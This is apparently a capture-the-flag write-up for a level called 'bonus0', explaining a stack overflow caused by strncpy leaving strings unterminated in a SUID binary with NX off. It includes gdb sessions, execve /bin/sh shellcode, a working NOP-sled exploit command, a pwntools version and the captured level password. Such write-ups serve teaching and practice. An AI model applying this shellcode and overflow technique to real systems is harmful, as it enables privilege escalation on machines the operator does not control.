# Bonus 0

Same recon as level0: SUID **bonus1**. `readelf -l` shows `GNU_STACK` as `RWE`: NX is disabled, so a payload written into the process's own memory can be executed as code, not just read as data. That is the whole strategy here: find a buffer we control, drop our own machine code in it, then bend a return address to point at it.

## Analysis

```c
void p(char *dest, char *prompt) {
    char buffer[4096];
    read(0, buffer, 0x1000);
    *strchr(buffer, '\n') = '\0';
    strncpy(dest, buffer, 20);        // does NOT null-terminate at exactly 20 bytes
}

void pp(char *out) {
    char a[20], b[20];
    p(a, " - ");                       // input 1
    p(b, " - ");                       // input 2
    strcpy(out, a);                    // a has no terminator -> reads into b...
    out[strlen(out)] = ' ';
    strcat(out, b);                    // ...and on past out
}

int main(void) { char buf[42]; pp(buf); puts(buf); }
```

> **strncpy without a terminator.** `strncpy(dest, src, n)` copies at most `n` bytes but only writes a trailing `\0` if the source is shorter than `n`. Feed exactly 20 bytes and `a` (or `b`) ends up with no terminator: whatever byte sits right after it in memory becomes "part of the string" the next time something calls `strlen`, `strcpy`, or `strcat` on it.

`a` and `b` are declared back to back in `pp`, per `disas pp`:

```
lea    -0x30(%ebp),%eax   ; a is at ebp-0x30
...
lea    -0x1c(%ebp),%eax   ; b is at ebp-0x1c
```

`-0x30` to `-0x1c` is exactly `0x14` = 20 bytes, so `a` and `b` sit with no gap between them. Fill both with exactly 20 bytes each (no terminator on either) and here is what happens at `strcpy(out, a)`: `strcpy` copies byte by byte until it hits a `\0`. It copies `a`'s 20 bytes, finds no terminator, keeps going into whatever is next in memory, which is `b`, copies `b`'s 20 bytes, still no terminator, and keeps going into `pp`'s saved registers and return address until it finally finds a stray zero byte somewhere on the stack. So the first `strcpy` alone can already run `out` well past its 42-byte bound and over the saved return address of `main`.

Then `strcat(out, b)` runs. `strcat` first walks `out` to find its end (the same null byte `strcpy` just wrote), then copies `b` in **again**, right there. This second copy is the important one: whichever byte of `b` a given memory address gets from `strcat` is the one that survives, since it is the last write to that address. So the saved return address of `main` ends up holding whatever byte of `b` last landed on it, and we can find out which byte that is by testing it directly instead of doing frame arithmetic by hand.

### Finding which byte of `b` lands on the return address

Send a cyclic pattern (every 4-byte window unique, e.g. `Aa0Aa1Aa2...`) as the second input, so whatever ends up in EIP tells us exactly which offset of `b` reached the return address. Send the two inputs as two separate writes, a short `sleep` apart, so they land in the program's two separate `read()` calls instead of one:

```
$ (python -c 'print "0"*20'; sleep 0.3; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"'; sleep 0.3) | gdb -q -batch -ex run -ex 'p/x $eip' ./bonus0

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
$1 = 0x41336141
```

`0x41336141` read as bytes is `0x41 0x61 0x33 0x41` = `"Aa3A"`. In the pattern, `"Aa3A"` starts at index **9** (`Aa0`=0..2, `Aa1`=3..5, `Aa2`=6..8, `Aa3`=9..11), which you can also get by feeding `0x41336141` straight into a pattern offset tool (e.g. [wiremask's buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), or pwntools' `cyclic_find(0x41336141)`), since this pattern is the same letter+letter+digit cyclic sequence those tools generate. So byte 9 of the second input is the first byte that lands on the return address; bytes 9..12 are our 4-byte target.

> **Why the `sleep` between the two writes?** `p()` calls `read(0, buffer, 0x1000)` twice, once per call. `read()` on a pipe returns whatever is sitting in the pipe at the moment it is called; it does not wait around to see if more is coming. Write both inputs to the pipe back to back with no gap, and the first `read()` can scoop up both of them at once, leaving nothing for the second `read()`, which then hangs or reads garbage instead of our second payload. Dropping a `sleep` between the two `python -c` calls above (or, in the final exploit below, running them as two separate commands in the pipeline) keeps each one lined up with its own `read()` call. Skip it and the exploit breaks: the second prompt never gets its real input.

## Exploit

### Why shellcode instead of reusing a function

Level1 could jump straight to an existing `run()` that called `system("/bin/sh")`. Here there is no such convenient function, so we bring our own code. That only works because NX is off, so the CPU will actually execute bytes we wrote ourselves; on a level with NX on, this approach is out and ret2libc/ROP become the answer instead (see [shellcode injection](../knowledge_base/shellcode_injection.md)).

### Where the shellcode lives, and why it needs a NOP sled

`a` and `b` are only 20 bytes each, too small for any real shellcode. `p`'s own `buffer` is 4096 bytes, plenty. The plan:

- First `p()` call: `read` fills `buffer` with a NOP sled plus shellcode, and `strncpy` copies only the first 20 bytes of that into `a` (harmless, we don't care what ends up in `a`).
- `buffer` is a local variable of `p`, so it lives at the same stack address on both calls to `p`. The second call's `read` only overwrites `buffer`'s first 20 bytes (with whatever the second input is); the sled and shellcode we planted after byte 20 in the first call are untouched and still sitting at the same address when `main` later jumps there.

We aim the overwritten return address at a spot *inside* the sled, not at the shellcode's first byte, because we cannot pin down `buffer`'s address to the exact byte: gdb's own environment (its extra variables, the absolute path used to invoke the program) shifts the stack slightly compared to a plain shell invocation. A `\x90` (NOP, "do nothing") sled means landing anywhere in that region just slides down, one no-op at a time, until execution reaches the real shellcode. That is the entire reason the sled exists: it turns "guess the exact address" into "guess somewhere in a 100-byte window."

### Shellcode (28 bytes)

execve(`/bin/sh`), same Aleph One family as level2, with `ecx`/`edx` zeroed by register copy:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### Finding a real address for the sled

We need `buffer`'s actual stack address. `p` calls `read(0, buffer, 0x1000)`, so `buffer` is simply the second argument to `read`. Break on `read` and read that argument straight off the stack, no frame math required:

```
(gdb) b read
(gdb) run                       (type anything at the prompt)
(gdb) x/wx $esp+8               read's 2nd arg (cdecl: esp=ret, +4=fd, +8=buf)
0xbfffec24:     0xbfffec30
```

`esp+8` is a **stack slot that holds a pointer**, the `buf` argument the caller pushed for `read`. To get the pointer's value you have to read what's stored at that address, which is exactly what `x` (examine memory) does: `0xbfffec24:` is the stack slot itself, `0xbfffec30` is the pointer sitting inside it. That second number is `buffer`'s address.

Cross-check the same address the "long way", straight from the disassembly (`disas p` shows `lea -0x1008(%ebp),%eax` right before the call to `read`, i.e. `buffer = ebp - 0x1008`):

```
(gdb) p/x $ebp-0x1008
$1 = 0xbfffec30
```

This time there is nothing to dereference: `ebp - 0x1008` is not a stack slot holding a pointer, it *is* the address, computed directly by the same subtraction the `lea` instruction does. So this uses `p/x` (print the value of an expression) instead of `x` (examine memory at an address). Using `x $ebp-0x1008` here would be a mistake: it would dereference one step too far and show you the first 4 bytes stored *inside* `buffer` (probably `0x00000000` if `read` hasn't run yet) instead of `buffer`'s address.

Both methods agree: **`buffer = 0xbfffec30`** in this session. Aim into the sled, not at its start: `0xbfffec30 + 60 = 0xbfffec6c` → little-endian `\x6c\xec\xff\xbf`. If your own run lands on a different address, because of a different shell, a different length `cwd`, or anything else that changes the environment gdb hands to the process, just repeat these two commands and use the address you get. The offsets and shellcode do not change; only this one number does.

### Run

- input 1: 100 NOPs + 28-byte shellcode (= 128 bytes, fits in `buffer`).
- input 2: 9 pad + 4-byte return address + 7 filler (= 20 bytes, matching offset 9 found above).

```bash
$ (python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\x6c\xec\xff\xbf" + "B"*7'; cat) | ./bonus0
 - 
 - 
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

The euid flip to `bonus1` confirms the shellcode actually ran `execve("/bin/sh", ...)`, not just that `main` crashed somewhere convenient.

Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## Alternative: pwntools

Everything above was done by hand on purpose, to see exactly what each byte is for. In practice, [pwntools](https://docs.pwntools.com/) does the byte-packing and shellcode generation for you:

```python
shellcode = asm(shellcraft.sh())
io.sendline(b'\x90' * 100 + shellcode)          # input 1: sled + shellcode into `buffer`

payload = b'A' * 9 + p32(0xbfffec6c) + b'B' * 7  # input 2: overwrite the return address
io.sendline(payload)
```

`p32(0xbfffec6c)` replaces the manual `\x6c\xec\xff\xbf` little-endian reversal, and the two `io.sendline()` calls are two separate `write()`s on pwntools' end, the same reason the real exploit above uses two separate `python -c` commands, so there's no `sleep`/timing to reason about, pwntools' tube just does the right thing.

What pwntools does **not** do for you: it cannot tell you that `buffer`'s address is `0xbfffec30`, or that offset 9 is where the return address lands. Those still come from gdb, because they depend on this specific binary's stack layout.

One catch running this for real: `process('./bonus0')` runs a *local* copy of the binary, which has no SUID bit, so the exploit "works" but never actually reaches `bonus1`. To get an actual privilege escalation, connect to the real machine over SSH instead (pwntools only needs to be installed on the machine running the script, not on the target) and spawn the process there. The full script, `Ressources/exploit.py`, does exactly that.

